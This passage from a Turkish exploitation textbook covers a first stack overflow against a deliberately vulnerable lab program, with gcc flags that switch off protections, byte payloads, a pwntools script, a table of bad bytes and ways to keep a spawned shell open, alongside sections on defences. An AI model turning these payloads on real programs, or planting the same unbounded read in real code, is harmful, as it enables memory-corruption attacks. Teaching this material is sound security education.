> **Kısım III · Korumasız dünya.** Hiçbir korumanın olmadığı programlar: değişken ezme, dönüş adresini değiştirme, kendi kodunu çalıştırma.


# Bölüm 07: İlk taşma: komşu değişkeni ezmek

## Bu bölümde

Teori bitti. Bu bölümde ilk exploit'ini yazıyorsun. Hedef küçük: programın kontrolünü ele geçirmeyeceğiz, sadece "yetkin yok" diyen bir programa "hoş geldin admin" dedireceğiz. Ama bunu yaparken, kitabın geri kalanında her seferinde tekrarlayacağın dört adımlı yöntemi ilk kez uygulayacaksın: hatayı bul, yerleri bul, mesafeyi ölç, değeri paketle.

**Ön koşullar:** Bölüm 2 (little-endian), Bölüm 4 (`read`'in argümanlarını okumak), Bölüm 5 (`[rbp-X]` gösterimi).

**Bu bölümün sonunda:**

- Bir `read` çağrısının boyutunu buffer'ın boyutuyla karşılaştırarak taşmayı tespit edebileceksin.
- Assembly'den iki yerel değişkenin adresini bulup aralarındaki mesafeyi hesaplayabileceksin.
- Bir değişkene istediğin 4 baytlık değeri yazan bir payload'ı elle ve pwntools ile hazırlayabileceksin.
- Aynı hatanın kaynak kodda nasıl düzeltileceğini ve derleyicinin onu nasıl yakaladığını gösterebileceksin.

## Sezgi: sınırı çizilmemiş tarla

İki komşu tarla düşün. Aralarında çit yok, sadece tapuda "ilk 16 metre Ali'nin, sonrası Veli'nin" yazıyor. Ali traktörüyle sürmeye başlıyor ve 20 metre ilerliyor. Traktör tapuyu okumaz. Son 4 metre Veli'nin tarlası ama artık sürülmüş.

Bellek de böyle. `char name[16]` 16 bayt ayırır, ama `read` bu sınırı bilmez. Ona "64 bayta kadar yaz" dersen, 16. bayttan sonra yan tarladaki değişkenin üstüne yazmaya devam eder.

Benzetmenin bozulduğu yer: gerçek hayatta Veli bir gün tarlasına bakıp fark eder. Program fark etmez. Bir sonraki satırda o değişkeni okur ve senin yazdığın değeri kendi değeri sanır.

## Hedef

```c
/* e01_admin: komşu değişkeni ezme. Koruma yok. */
#include <stdio.h>
#include <unistd.h>

struct user {
    char name[16];
    unsigned int admin;
};

int main(void)
{
    struct user u;
    setvbuf(stdout, NULL, _IONBF, 0);
    u.admin = 0;
    printf("isim: ");
    read(0, u.name, 64);
    printf("admin = 0x%08x\n", u.admin);
    if (u.admin == 0x41424344)
        puts("hos geldin admin!");
    else
        puts("yetkin yok.");
    return 0;
}
```

Bir saniye dur ve hatayı kendin bul. Bulduysan devam et.

Evet: `name` 16 bayt, `read` 64 bayta kadar okuyor. Bu kitaptaki dokuz programın sekizinde hata tam olarak bu biçimde: **okuma boyutu, buffer'ın boyutundan büyük.** İnsanların gerçek kodda yaptığı hataların da şaşırtıcı bir kısmı böyle.

`setvbuf` satırına takılma. Programın çıktısını bekletmeden ekrana basmasını sağlıyor, böylece çıktıyı bir boruya yönlendirdiğimizde mesajlar kaybolmuyor. Exploit açısından önemsiz.

### Derleme

```bash
gcc -O0 -fno-stack-protector -no-pie -fcf-protection=none -z execstack \
    -o ~/cracks/e01_admin ~/.cracks_src/e01_admin.c
```

| Seçenek | Ne yapar | Gerçek hayatta |
|---|---|---|
| `-O0` | İyileştirme yok. Assembly, C'ye satır satır benzer. | Dağıtımlar genelde `-O2` kullanır. |
| `-fno-stack-protector` | Canary'yi kapatır. | Çoğu dağıtımda varsayılan olarak açık. |
| `-no-pie` | Program hep `0x400000`'a yüklenir. | Çoğu dağıtımda PIE varsayılan. |
| `-fcf-protection=none` | `endbr64` gibi donanım koruma işaretlerini kaldırır, assembly sadeleşir. | Varsayılan olarak açık. |
| `-z execstack` | Yığını çalıştırılabilir yapar. Bu örnek için gerekmiyor. Kısım III'teki bütün örnekleri aynı ayarlarla derledik. | Neredeyse hiç kullanılmaz. |

Tablonun son sütunu önemli. Bu örneklerdeki korumaları bilerek kapatıyoruz ki önce temel mekanizmayı görelim. Kısım IV'te onları birer birer geri açacağız.

## Normal davranış

Önce programı olması gerektiği gibi kullanalım:

```bash
printf 'AAAA' | ~/cracks/e01_admin
```

```text
isim: admin = 0x00000000
yetkin yok.
```

4 bayt gitti, `name`'e yazıldı, `admin` sıfır kaldı. Beklenen bu.

## Yerleri bulmak

C koduna bakıp "`name` önce tanımlandı, demek ki bellekte de önce duruyor" diye düşünmek cazip. Bu sefer doğru, çünkü bir `struct` içindeki alanların sırasını derleyici değiştiremez. Ama ayrı ayrı tanımlanmış yerel değişkenlerin sırasını değiştirebilir, ve değiştirir. Alışkanlık edin: **yerleri her zaman assembly'den oku.**

```bash
objdump -d -M intel --no-show-raw-insn ~/cracks/e01_admin | sed -n '/<main>:/,/ret/p'
```

```text
401156:  push   rbp
401157:  mov    rbp,rsp
40115a:  sub    rsp,0x20
...
40117c:  mov    DWORD PTR [rbp-0x10],0x0        ← u.admin = 0
...
401197:  lea    rax,[rbp-0x20]                  ← u.name
40119b:  mov    edx,0x40                        ← 64
4011a0:  mov    rsi,rax
4011a3:  mov    edi,0x0
4011a8:  call   401050 <read@plt>               ← read(0, u.name, 64)
4011ad:  mov    eax,DWORD PTR [rbp-0x10]
...
4011c6:  mov    eax,DWORD PTR [rbp-0x10]        ← u.admin
4011c9:  cmp    eax,0x41424344                  ← == 0x41424344 ?
4011ce:  jne    4011e1 <main+0x8b>              ← değilse "yetkin yok"
```

Okuma sırası:

1. **Giriş:** `sub rsp,0x20`, yerel değişkenlere 32 bayt.
2. **`mov DWORD PTR [rbp-0x10],0x0`**: 4 baytlık (`DWORD`) bir değişkene 0 yazılıyor. C'de `u.admin = 0`. Demek ki `admin` → `rbp-0x10`.
3. **`lea rax,[rbp-0x20]` … `call read`**: Bölüm 4'te bu kalıbı çözmüştük. `read(0, rbp-0x20, 64)`. Demek ki `name` → `rbp-0x20`.
4. **`cmp eax,0x41424344` / `jne`**: Karar burada. Eşit değilse "yetkin yok"a zıpla.

İki adresi bir şekle dökelim:

```text
rbp-0x20  ┌──────────────────────────────────┐
          │ name[0..15]   (16 bayt)          │ ← read buradan başlar
rbp-0x10  ├──────────────────────────────────┤
          │ admin (4 bayt) │ (boş, 4 bayt)   │ ← 17.–20. baytlar buraya
rbp-0x08  ├──────────────────────────────────┤
          │ (boş, 8 bayt)                    │
rbp       ├──────────────────────────────────┤
          │ kaydedilmiş rbp                  │
rbp+0x08  ├──────────────────────────────────┤
          │ dönüş adresi                     │ ← read 64 bayta kadar izin veriyor:
          └──────────────────────────────────┘   bunu da ezebiliriz (Bölüm 9)
```

Mesafe: `0x20 − 0x10 = 0x10 = 16`. `name`'in 16. baytından sonra yazılan her bayt `admin`'e düşer.

`admin`'den sonraki 4 bayt ve onun altındaki 8 bayt neden boş? Derleyici yığın çerçevesini 16'nın katı olacak şekilde ayarlıyor (Bölüm 15'te bu kuralın nedenini göreceğiz). `struct` 20 bayt, çerçeve 32 bayt, aradaki 12 bayt dolgu.

## Deneme sürüşü

Tahmin: 16 bayt `name`'i doldurur. 20 bayt gönderirsek son 4'ü `admin`'e düşmeli.

```bash
printf 'AAAAAAAAAAAAAAAAAAAA' | ~/cracks/e01_admin
```

```text
isim: admin = 0x41414141
yetkin yok.
```

Program `admin`'in `0x41414141` olduğunu kendisi söylüyor. Programın hiç dokunmaması gereken bir değişkeni değiştirdin. Bölüm 2'de aynı belleğe gdb'den bakmıştık:

```text
0x7fffffffd440: 0x4141414141414141  0x4141414141414141   ← name
0x7fffffffd450: 0x0000000041414141  ...                   ← admin
```

Şimdi doğru değeri yazalım. Program `0x41424344` istiyor. Little-endian, yani bellekte `44 43 42 41` olmalı, harf olarak `D C B A`:

```bash
printf 'AAAAAAAAAAAAAAAADCBA' | ~/cracks/e01_admin
```

```text
isim: admin = 0x41424344
hos geldin admin!
```

İlk exploit'in çalıştı.

### Harflerle uğraşmadan

Gerçek hedeflerde yazılacak değer neredeyse hiçbir zaman harflere denk gelmez. Sayıyı doğrudan paketle:

```bash
python3 -c 'import sys; sys.stdout.buffer.write(b"A"*16 + (0x41424344).to_bytes(4,"little"))' | ~/cracks/e01_admin
```

```text
isim: admin = 0x41424344
hos geldin admin!
```

`(0x41424344).to_bytes(4, "little")` Python'un kendi paketleme yolu, `p32` ile aynı işi yapıyor.

### pwntools ile

Şimdi aynı şeyi, kitap boyunca kullanacağımız iskeletle yazalım. Bu dosya `~/.cracks_src/e01_admin_x.py` olarak duruyor:

```python
from pwn import *

p = process("/home/linkola/cracks/e01_admin")
payload = b"A"*16 + p32(0x41424344)
p.sendafter(b"isim: ", payload)
print(p.recvall().decode())
```

```text
admin = 0x41424344
hos geldin admin!
```

Dört satır. `process` programı başlatıyor. `sendafter`, program `isim: ` yazana kadar bekleyip payload'ı gönderiyor. `recvall` program kapanana kadar ne yazdıysa topluyor. Bu iskeletin `payload` dışındaki her satırı sonraki bölümlerde neredeyse aynı kalacak.

## Binary Ninja'da

`e01_admin`'i Binary Ninja'da açıp `main`'e HLIL görünümünde bakarsan şuna benzer bir şey görürsün (temsili, sürüme göre isimler değişebilir):

```c
int32_t var_18 = 0
printf("isim: ")
read(0, &var_28, 0x40)
printf("admin = 0x%08x\n", zx.q(var_18))
if (var_18 != 0x41424344) puts("yetkin yok.")
else puts("hos geldin admin!")
```

İsimlere bak: `var_28` ve `var_18`. Binary Ninja bunları dönüş adresine olan uzaklığa göre adlandırıyor (Bölüm 6). Aradaki fark `0x28 − 0x18 = 0x10 = 16`. gdb'de bulduğun mesafenin aynısı, bu sefer tek bir çıkarma işlemiyle.

## Savunma tarafı

Bu hatayı üç farklı seviyede durdurmak mümkün. Üçünü de bu makinede denedik.

**1. Kaynak kodda düzelt.** Asıl çözüm bu. Okunacak boyutu buffer'ın boyutuyla sınırla:

```c
read(0, u.name, sizeof(u.name));
```

Bu tek değişiklikle derlenen program aynı payload'a şöyle cevap veriyor:

```text
isim: admin = 0x00000000
yetkin yok.
```

`read` artık en fazla 16 bayt okuyor. Fazlası programa hiç ulaşmıyor.

**2. Derleyiciyi dinle.** gcc bu hatayı derlerken zaten görüyor. Bu programı derlediğimizde ekrana şu uyarı geldi:

```text
e01_admin.c:16:5: warning: 'read' writing 64 bytes into a region of size 16 overflows the destination [-Wstringop-overflow=]
```

Derleyici sana "16 baytlık bir yere 64 bayt yazıyorsun" diyor. Bu kitaptaki örnekleri derlerken bu uyarıları gördük ve bilerek görmezden geldik. Gerçek bir projede `-Wall -Werror` ile uyarıları hataya çevirmek, bu sınıf hataların büyük kısmını daha derleme aşamasında yakalar.

**3. FORTIFY_SOURCE.** `-D_FORTIFY_SOURCE=2` (iyileştirme açıkken çalışır) ile derlenen programlarda glibc, boyutu derleme anında bilinen buffer'lara yazan fonksiyonları kontrollü sürümleriyle değiştirir. `read` yerine `__read_chk` çağrılır ve o, boyutu çalışma anında kontrol eder:

```bash
gcc -O2 -D_FORTIFY_SOURCE=2 -fno-stack-protector -no-pie -o e01_fort e01_admin.c
printf 'AAAAAAAAAAAAAAAADCBA' | ./e01_fort; echo " rc=$?"
```

```text
isim: *** buffer overflow detected ***: terminated
 rc=134
```

Program `admin`'e dokunulmadan önce kendini öldürdü. Çıkış kodu 134, yani SIGABRT.

**Peki canary bu hatayı durdurur mu?** Durdurmaz. Canary dönüş adresinin önüne konur. `admin` ise buffer'la canary'nin **arasında** duruyor. Program `admin`'i fonksiyon dönmeden çok önce okuyor. Bölüm 17'de bunun tam olarak neden böyle olduğunu göreceksin.

> [!WARNING]
> **Sık yapılan hatalar**
>
> - **Değişkenlerin C'deki sırayla durduğunu varsaymak.** `struct` dışındaki yerel değişkenlerin sırası derleyiciye kalmış. Her zaman `[rbp-X]`'lere bak.
> - **`printf "...DCBA"` yerine `echo "...DCBA"` kullanmak.** `echo` sonuna Enter ekler. Burada zararsız (21. bayt `admin`'e değil boşluğa düşüyor), ama başka programlarda değişkenin bir sonraki baytını bozar.
> - **4 baytlık bir değişken için `p64` kullanmak.** 8 bayt yazarsın, fazladan 4 bayt komşunun üstüne gider.
> - **`ABCD` yazmak.** Little-endian. `DCBA`.

## Kontrol soruları

1. `e01_admin`'deki hatayı tek cümleyle tarif et.
2. `admin`'in adresi neden `rbp-0x10`? Bunu hangi assembly satırından anladın?
3. 17 bayt gönderirsen `admin` ne olur?
4. `read` en fazla 64 bayt okuyor. Bu, dönüş adresine ulaşmaya yeter mi?
5. FORTIFY'lı derlenmiş program neden `buffer overflow detected` dedi?
6. Canary bu programdaki `admin` değişkenini neden korumaz?

## Alıştırmalar

1. **Gözlemle.** `pwndbg -q ~/cracks/e01_admin`, `b *0x4011c9`, `r < /tmp/a20`. `cmp` komutunda dur ve `p/x $eax` ile programın neyi karşılaştırdığına bak.
2. **Tahmin et, sonra dene.** 17 bayt gönder: `printf 'AAAAAAAAAAAAAAAAB'`. Göndermeden önce programın yazacağı `admin` değerini kâğıda yaz.
3. **Kendin yap.** `admin`'i `0xdeadbeef` yap. Program "yetkin yok" diyecek ama `admin = 0xdeadbeef` yazmalı.
4. **Merdiven.** `~/cracks/p01_gate` aynı türde bir hata içeriyor. Farkları: girdi `fgets` ile okunuyor ve program `-O2` ile derlenmiş, yani yerler `[rsp+X]` olarak görünüyor. Bu bölümdeki dört adımı uygula. `fgets` girdinin sonuna Enter'ı ve bir null bayt ekler. Bu iki baytın hedef değişkenin neresine düştüğünü kâğıda çiz.

## Özet

- Hatanın biçimi: **okuma boyutu > buffer boyutu.** Bunu `read`, `fgets`, `memcpy` çağrılarında ara.
- Değişkenlerin yerini assembly'den oku: `[rbp-X]`.
- Mesafe = hedefin adresi − buffer'ın adresi.
- Hedef değeri little-endian paketle: `p32`, `p64`.
- Savunma: boyutu `sizeof` ile sınırla, derleyici uyarılarını dinle, FORTIFY_SOURCE kullan.
- Canary, buffer ile kendisi arasındaki değişkenleri korumaz.

Bu bölümde bir değişkeni değiştirdik. Ama dikkat edersen `read`'in sınırı dönüş adresine kadar uzanıyordu. Bir sonraki bölümde girdiyi programa göndermenin bütün inceliklerini toplayacağız, ondan sonraki bölümde de o dönüş adresinin üstüne yazacağız.

---
**Kontrol sorularının cevapları**

1. 16 baytlık `name`'e `read` ile 64 bayta kadar okunuyor.
2. `mov DWORD PTR [rbp-0x10],0x0` satırı `admin = 0` atamasının karşılığı. `cmp`'den önceki `mov eax,DWORD PTR [rbp-0x10]` de aynı adresi okuyor.
3. Sadece `admin`'in en düşük baytı değişir: `admin = 0x00000041`. (Bu makinede denendi.)
4. Yeter. Dönüş adresinin sonu `0x20 + 8 + 8 = 48`. bayta denk geliyor, 64'ten küçük.
5. FORTIFY, `read`'i `__read_chk` ile değiştirdi. Bu fonksiyon `name`'in 16 bayt olduğunu biliyor ve 64 baytlık bir okumaya izin vermiyor.
6. Canary dönüş adresinin önünde duruyor ve sadece fonksiyon dönerken kontrol ediliyor. `admin` hem canary'den önce duruyor hem de fonksiyon dönmeden çok önce okunuyor.

**Bu bölümde geçen yeni terimler:** zafiyet, payload, dolgu, mesafe (offset), FORTIFY_SOURCE, `-Wstringop-overflow`.


# Bölüm 08: Girdi hazırlamak

## Bu bölümde

Bir payload'ı hazırlamak işin yarısı. Diğer yarısı onu programa bozulmadan ulaştırmak. Bu bölüm kısa ama bir sürü saç yoldurmayı önleyecek: hangi okuma fonksiyonu hangi baytları kabul etmez, payload'ı göndermenin dört yolu, kabuk açıldığında onu nasıl açık tutacağın, ve bu kitabı yazarken bizi de yakalayan bir zamanlama tuzağı.

**Ön koşullar:** Bölüm 2 ve 7.

**Bu bölümün sonunda:**

- Bir okuma fonksiyonuna bakıp payload'ında hangi baytların sorun çıkaracağını söyleyebileceksin.
- Aynı payload'ı `printf`, Python, dosya ve pwntools ile gönderebileceksin.
- Açılan bir kabuğu `(cat payload; cat)` hilesiyle açık tutabileceksin.
- Payload'ı `read`'in boyutuna tamamlayarak iki ayrı gönderimin birbirine karışmasını önleyebileceksin.

## Kötü baytlar

Programın girdiyi hangi fonksiyonla okuduğu, hangi baytları gönderebileceğini belirler:

| Fonksiyon | Nerede durur | Payload'a koyamayacağın baytlar |
|---|---|---|
| `read(fd, buf, n)` | `n` bayt okuyunca ya da gelen veri bitince | **Hiçbiri.** Her bayt geçer. |
| `fgets(buf, n, f)` | `\n` (0x0a) görünce ya da `n-1` bayt okuyunca. Sonuna `0x00` ekler. | `0x0a` |
| `gets(buf)` | `\n` görünce. **Sınırı yok.** | `0x0a` |
| `scanf("%s", buf)` | Boşluk görünce | `0x09 0x0a 0x0b 0x0c 0x0d 0x20` |
| `strcpy(dst, src)` | `0x00` görünce | `0x00` |

Payload'ında bu tabloya göre yasak bir bayt varsa, o bayttan sonrası programa ulaşmaz. Bu baytlara **kötü baytlar (bad chars)** denir.

Bu tablonun en sinsi satırı `strcpy`. 64 bitlik adreslerin üst baytları neredeyse hep `00`'dır: `0x0000000000401166`. `strcpy` ile kopyalanan bir payload, içindeki **ilk** adresin ilk sıfır baytında kesilir. Kitaptaki örneklerin hepsi `read` kullandığı için bu sorunu yaşamayacağız, ama gerçek hedeflerde sık çıkar. Çözümler arasında adresi payload'ın en sonuna koymak (sıfırları zaten oraya kadar gerek yok) ya da kısmi yazma (Bölüm 18) var.

## Dört gönderme yolu

**1. `printf`.** Kısa, elle yazılabilen payload'lar için:

```bash
printf 'AAAAAAAAAAAAAAAA\x44\x43\x42\x41' | ~/cracks/e01_admin
```

```text
isim: admin = 0x41424344
hos geldin admin!
```

**2. Python, boruya.** Hesaplanması gereken uzun payload'lar için:

```bash
python3 -c 'import sys; sys.stdout.buffer.write(b"A"*16 + b"\x44\x43\x42\x41")' | ~/cracks/e01_admin
```

**3. Dosya.** Exploit'i gdb'de adım adım izlemenin yolu:

```bash
python3 -c 'import sys; sys.stdout.buffer.write(b"A"*16 + b"DCBA")' > /tmp/pay
xxd /tmp/pay
pwndbg -q ~/cracks/e01_admin
r < /tmp/pay
```

**4. pwntools.** Programın cevabına göre bir sonraki adımı hesaplaman gerekiyorsa. Bölüm 15'ten sonra hep böyle olacak, çünkü programdan bir adres okuyup ikinci payload'ı o adrese göre kuracağız.

## Kabuğu açık tutmak

Bölüm 11'den itibaren exploit'lerimiz bir kabuk açacak. Boruyla gönderirsen bir sorun çıkar: `printf` işini bitirince boru kapanır. Kabuk açılır, girdi bekler, borunun kapalı olduğunu görür ve hemen kapanır. Sen hiçbir şey görmezsin.

Klasik çözüm:

```bash
(cat /tmp/pay; cat) | ./program
```

İlk `cat` payload'ı gönderir. İkinci `cat` klavyeden okumaya devam eder ve yazdığın her şeyi kabuğa iletir. Ekranda bir istem (`$`) görmezsin, çünkü kabuk bir terminale değil bir boruya bağlı. Ama `id` yazıp Enter'a basarsan cevap gelir.

pwntools'ta bunun karşılığı tek satır: `p.interactive()`.

## Zamanlama tuzağı

Bu tuzak bizi bu kitabı yazarken gerçekten yakaladı, o yüzden ayrı bir başlık hak ediyor.

`read(0, buf, 200)` "en fazla 200 bayt oku" der. Ama o anda boruda ne kadar veri varsa onu alır. Payload'ı gönderip hemen arkasından bir komut daha gönderirsen ikisi aynı anda boruda olabilir. `read` ikisini birden yutar. İkinci gönderdiğin şey, örneğin kabuğa gitmesini istediğin `id` komutu, kabuk daha açılmadan programın buffer'ının içinde kaybolur.

Belirtisi: exploit "çalışıyor gibi" ama kabuk hiçbir komuta cevap vermiyor. Bölüm 15'teki ret2libc exploit'inin ilk sürümü tam olarak böyle davrandı: `b''` döndü, yani hiçbir şey.

İki çözüm var:

```python
# 1. Payload'ı read'in tam okuma boyutuna tamamla
p.send(payload.ljust(200, b"\0"))   # read tam 200 bayt alır
p.sendline(b"id")                   # bu bir sonraki okumaya kalır

# 2. Arada bekle (daha kırılgan)
p.send(payload)
sleep(0.3)
p.sendline(b"id")
```

Birinci çözümü tercih et. Bekleme süresi makineden makineye değişir, `ljust` değişmez. Bölüm 11'deki elle yapılan denemede `sleep 0.3` kullandık, çünkü orada `ljust` imkânımız yoktu.

## Deneme sürüşü: payload'ı kontrol et

Göndermeden önce payload'a `xxd` ile bakmayı alışkanlık haline getir. Bir sonraki bölümde kullanacağımız payload:

```bash
python3 -c 'import sys; from pwn import p64; sys.stdout.buffer.write(b"A"*40 + p64(0x401166))' | xxd
```

```text
00000000: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
00000010: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
00000020: 4141 4141 4141 4141 6611 4000 0000 0000  AAAAAAAAf.@.....
```

Kontrol listesi:

1. **Uzunluk:** son satır `0x20`'de başlıyor ve 16 bayt içeriyor: toplam `0x30` = 48 bayt. 40 dolgu + 8 adres. ✓
2. **Sıra:** `66 11 40 00 00 00 00 00`, yani `0x401166` little-endian. ✓
3. **İstenmeyen bayt:** sonda `0a` yok. ✓

Payload hatalarının neredeyse hepsi bu üç maddeden birine düşer. Bir exploit çalışmadığında ilk bakacağın yer burası.

## Savunma tarafı

Kötü baytlar tablosu, aslında bir savunma tablosu olarak da okunabilir. `scanf("%s")` ya da `gets` kullanan bir program, `strcpy` kullanan bir programdan daha kolay sömürülür, çünkü kabul ettiği bayt aralığı daha geniştir. Ama hiçbiri gerçek bir savunma değil. Kötü baytlar saldırganın işini zorlaştırır, imkânsız kılmaz: bu kısıtlar altında çalışan shellcode'lar ve ROP zincirleri yazmak için bütün teknikler var. Tek gerçek savunma, Bölüm 7'deki gibi okuma boyutunu sınırlamak.

> [!WARNING]
> **Sık yapılan hatalar**
>
> - **Python'da `print()` kullanmak.** Metne çevirir, `\n` ekler, `0x80` üstü baytları bozar. `sys.stdout.buffer.write`.
> - **Kabuk açıldığı halde "çalışmadı" sanmak.** Boru kapanmıştır. `(cat pay; cat) |` kullan.
> - **İki gönderimin aynı `read`'e gitmesi.** `ljust(n)` ile tamamla.
> - **`fgets` kullanan bir programda payload'ın ortasında `0x0a` olması.** Adreslerin içinde de `0a` baytı çıkabilir. `xxd` ile kontrol et.

## Kontrol soruları

1. `gets` ile okuyan bir programa `0x0a` baytı içeren bir payload gönderirsen ne olur?
2. `strcpy` ile kopyalanan bir payload'da adresleri nereye koymalısın?
3. `(cat pay; cat) | ./program` komutundaki ikinci `cat` ne işe yarar?
4. `p.send(payload); p.sendline(b"id")` neden bazen çalışmaz?
5. Bir payload'ın uzunluğunu `xxd` çıktısından nasıl okursun?

## Alıştırmalar

1. **Gözlemle.** `printf 'AB\nCD' | xxd` ve `echo 'ABCD' | xxd` çıktılarını karşılaştır. `echo` neyi ekledi?
2. **Tahmin et, sonra dene.** `python3 -c 'print("A"*4 + "\xef")' | xxd` komutunun kaç bayt üreteceğini tahmin et. Neden 5 değil?
3. **Kendin yap.** Bölüm 7'deki `e01_admin` exploit'ini önce bir dosyaya yaz, sonra pwndbg'de `r < dosya` ile çalıştırıp `cmp` satırında dur.

## Özet

- Okuma fonksiyonu kötü baytları belirler: `read` hiçbiri, `fgets`/`gets` `0x0a`, `strcpy` `0x00`, `scanf` boşluklar.
- Gönderme yolları: `printf`, Python ile boru, dosya + `r < dosya`, pwntools.
- Kabuğu açık tutmak için `(cat pay; cat) |` ya da `p.interactive()`.
- Ardışık gönderimler aynı `read`'e karışabilir: `ljust(n)` ile tamamla.
- Göndermeden önce `xxd` ile uzunluk, sıra ve istenmeyen baytlara bak.

Artık payload'ı programa sağ salim ulaştırabiliyoruz. Sırada asıl ödül var: dönüş adresi.

---
**Kontrol sorularının cevapları**

1. `gets` `0x0a`'yı satır sonu kabul eder ve okumayı orada bitirir. Payload'ın geri kalanı programa ulaşmaz.
2. Payload'ın sonuna. `strcpy` ilk `0x00`'da durur, adresin üst baytları da `00`'dır.
3. Klavyeden okumaya devam eder ve yazdıklarını programa, yani açılan kabuğa iletir.
4. İkisi aynı anda boruda olursa tek bir `read` çağrısı ikisini birden okur.
5. Son satırın başındaki konum ile o satırdaki bayt sayısını topla.

**Bu bölümde geçen yeni terimler:** kötü bayt (bad char), boru (pipe).

---

[← 03-araclar](03-araclar.md) · [İçindekiler](README.md) · [05-donus-adresi-ve-ret2win →](05-donus-adresi-ve-ret2win.md)
